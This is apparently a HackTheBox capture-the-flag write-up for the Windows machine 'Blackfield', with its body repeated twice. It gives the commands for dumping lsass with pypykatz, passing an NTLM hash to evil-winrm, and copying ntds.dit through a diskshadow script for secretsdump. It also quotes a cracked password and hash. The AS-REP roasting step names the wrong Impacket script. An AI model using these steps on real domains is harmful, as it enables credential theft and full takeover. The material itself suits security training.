---

---

# Summary
Blackfield is a hard windows machine that involves initially gaining access as anonymous user to the profiles$ share and using all the usernames with GetSPNUsers.py giving us the hash for the user support which can be used to log into rpcclient and change the password for the user audit2020. Using the new credentials we authenticate with SMB again and grab the forensics share and the lsass.DMP file which contains working NTLM hash of the user svc_backup. Using which we login through evil-winrm. Abusing the SeBackupPrivilege and SeRestorePrivilege we can use diskshadow to get the ntds.dit and system hive using which we can dump the administrator hash and psexec in.

# NMAP:

NMAP scan reveals the following :

```
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-06 17:05:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
```

## SMB - 1

Attempting to authenticate with a anonymous:anonymous gives us access to the shares.

Using GetUserSPNs.py and the custom list of users we generate using the folders in the SMB profiles$ share we get the aseproast hash for the user support and cracking the hash reveals the password of #00^BlackKnight.

## RPC

Using the credentials we log in to RPC and follow the [https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html) guide to change the password for the user audit2020.

## SMB - 2

Checking the SMB share forensics we find a lsass.DMP file in the memory_analysis folder which most likely contains the hash for the current user. Therefore, using the tool pypykatz we are able to retrieve the hash for the user

```
pypykatz lsa minidump lsass.dmp
```

Using the hash along with evil-winrm gives us a shell as svc_backup.

```
evil-winrm -i 10.10.10.192 -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup
```

# Privilege Escalation

Checking the privileges for the current user reveals that the user svc_backup has the SeRestorePrivilege and the SeBackupPrivilege which can be abused to own a file and backup a file.

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

In order to abuse the privileges we use the following  [https://gist.github.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9](https://gist.github.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9%20to%20get%20the%20ntds.dit).

Make a temp directory and add diskshadow.txt. Running diskshadow.txt will give an error and in order to avoid it a space character needs to be added to the end of each line.

```
$ cat diskshadow.txt
set context persistent NOWRITERS 
add volume c: alias someAlias 
create 
expose %someAlias% z: 
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit 
delete shadows volume %someAlias% 
reset

------- Inside Evil-winrm -------
PS > cd C:\ ; mkdir temp ; cd temp
PS > upload diskshadow.txt
PS > diskshadow.exe /s c:\temp\diskshadow.txt
PS > cd z:/windows/ntds
PS > download ntds.dit
PS > reg.exe save hklm\system c:\temp\system.bak
PS > download c:\temp\system.bak

$ secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

This gives us an administrator hash which can be used with psexec.py to gain admin on the machine.

# NMAP:

NMAP scan reveals the following :

```
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-06 17:05:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
```

## SMB - 1

Attempting to authenticate with a anonymous:anonymous gives us access to the shares.

Using GetUserSPNs.py and the custom list of users we generate using the folders in the SMB profiles$ share we get the aseproast hash for the user support and cracking the hash reveals the password of #00^BlackKnight.

## RPC

Using the credentials we log in to RPC and follow the [https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html) guide to change the password for the user audit2020.

## SMB - 2

Checking the SMB share forensics we find a lsass.DMP file in the memory_analysis folder which most likely contains the hash for the current user. Therefore, using the tool pypykatz we are able to retrieve the hash for the user

```
pypykatz lsa minidump lsass.dmp
```

Using the hash along with evil-winrm gives us a shell as svc_backup.

```
evil-winrm -i 10.10.10.192 -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup
```

# Privilege Escalation

Checking the privileges for the current user reveals that the user svc_backup has the SeRestorePrivilege and the SeBackupPrivilege which can be abused to own a file and backup a file.

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

In order to abuse the privileges we use the following  [https://gist.github.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9](https://gist.github.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9%20to%20get%20the%20ntds.dit).

Make a temp directory and add diskshadow.txt. Running diskshadow.txt will give an error and in order to avoid it a space character needs to be added to the end of each line.

```
$ cat diskshadow.txt
set context persistent NOWRITERS 
add volume c: alias someAlias 
create 
expose %someAlias% z: 
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit 
delete shadows volume %someAlias% 
reset

------- Inside Evil-winrm -------
PS > cd C:\ ; mkdir temp ; cd temp
PS > upload diskshadow.txt
PS > diskshadow.exe /s c:\temp\diskshadow.txt
PS > cd z:/windows/ntds
PS > download ntds.dit
PS > reg.exe save hklm\system c:\temp\system.bak
PS > download c:\temp\system.bak

$ secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

This gives us an administrator hash which can be used with psexec.py to gain admin on the machine.
